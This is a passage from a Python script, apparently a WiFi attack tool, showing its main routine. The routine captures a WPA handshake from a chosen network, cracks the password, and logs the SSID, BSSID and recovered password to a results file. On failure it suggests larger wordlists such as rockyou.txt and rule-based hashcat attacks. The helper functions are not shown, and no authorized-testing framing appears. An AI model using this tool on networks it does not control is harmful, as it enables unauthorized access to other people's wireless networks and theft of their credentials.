    if confirm.lower() != 'y':
        print("[*] Cancelled")
        cleanup()
        sys.exit(0)

    # Ensure channel is set
    if not selected.channel:
        selected = selected._replace(channel=1)
        print(f"[!] Channel unknown, defaulting to channel 1")

    # Capture handshake
    print(f"\n{'=' * 60}")
    print("[*] STARTING HANDSHAKE CAPTURE")
    print(f"{'=' * 60}")

    capture_file = capture_handshake(
        interface,
        selected.bssid,
        selected.channel,
        selected.ssid
    )

    if not capture_file:
        print("[-] Handshake capture failed or was cancelled")
        cleanup()
        sys.exit(1)

    # Crack password
    print(f"\n{'=' * 60}")
    print("[*] STARTING PASSWORD CRACKING")
    print(f"{'=' * 60}")

    password = crack_wpa_password(capture_file, selected.bssid)

    # Save results
    if password:
        results_file = 'cracked_results.txt'
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(results_file, 'a') as f:
            f.write(f"{'=' * 60}\n")
            f.write(f"Date:     {timestamp}\n")
            f.write(f"SSID:     {selected.ssid}\n")
            f.write(f"BSSID:    {selected.bssid}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'=' * 60}\n\n")
        print(f"\n[+] Results saved to: {results_file}")
        print(f"\n{'=' * 60}")
        print("[SUCCESS] WiFi password cracked!")
        print(f"{'=' * 60}")
    else:
        print(f"\n{'=' * 60}")
        print("[FAILURE] Could not crack password")
        print(f"{'=' * 60}")
        print("[*] Suggestions:")
        print("    1. Use a larger wordlist (e.g. rockyou.txt)")
        print("    2. Try hashcat with rule-based attacks")
        print("    3. Password may not be in the wordlist")

    cleanup()

    print(f"\n{'=' * 60}")
    print("[*] SESSION COMPLETED")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
        cleanup()
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)
